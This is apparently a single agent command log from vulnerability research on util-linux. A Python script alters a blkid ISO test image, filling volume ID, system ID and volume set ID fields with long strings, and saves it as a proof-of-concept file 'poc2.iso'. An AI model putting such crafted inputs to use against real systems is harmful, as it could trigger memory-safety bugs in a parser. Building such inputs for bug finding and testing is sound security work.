Running command: cd /workspace/repo-vul/src-vul/util-linux && python3 - <<'PY'
import lzma, pathlib, os
src=pathlib.Path('tests/ts/blkid/images-fs/iso-different-iso-joliet-label.img.xz')
data=bytearray(lzma.decompress(src.read_bytes()))
pvd=0x8000
j=0x8800
# Make PVD volume_id 32 chars and Joliet volume_id 16 chars, plus extend other fields similarly
for i in range(32): data[pvd+40+i]=ord('A')
for i in range(16): data[j+40+2*i]=0x00; data[j+40+2*i+1]=ord('A')
# Make system_id and volume_set_id also long and compatible to exercise more writes
for i in range(32): data[pvd+8+i]=ord('B')
for i in range(16): data[j+8+2*i]=0x00; data[j+8+2*i+1]=ord('B')
for i in range(128): data[pvd+190+i]=ord('C') if i<32 else ord(' ')
for i in range(64): data[j+190+2*i]=0x00; data[j+190+2*i+1]=ord('C') if i<32 else ord(' ')
out='/workspace/poc2.iso'
open(out,'wb').write(data)
print(out, len(data))
PY
